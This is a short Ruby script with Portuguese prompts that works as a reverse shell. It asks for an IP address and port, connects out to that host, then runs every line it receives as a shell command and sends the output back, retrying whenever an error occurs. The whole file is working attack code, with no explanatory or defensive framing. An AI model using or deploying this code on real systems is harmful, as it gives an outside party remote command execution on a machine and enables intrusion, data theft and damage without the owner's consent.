#!/usr/bin/env ruby
require 'socket'
require 'open3'


def reverse
  print "Coloque seu ip: "
  @lhost=gets.chomp
  print "Coloque a porta: "
  @port=gets.chomp
end

reverse

def connect
  @socket=TCPSocket.new "#{@lhost}", "#{@port}"
  @socket.puts "Conectado !!"
end

def try
    begin
      connect
    rescue
      sleep 0.7
    end
end

try 

def reverse_shell
  begin
    while linha = @socket.gets
      Open3.popen2e("#{linha}") do | stdin,stdout_and_stderr |
            IO.copy_stream(stdout_and_stderr, @socket)
    end
  end
end
rescue 
  retry
end
reverse_shell
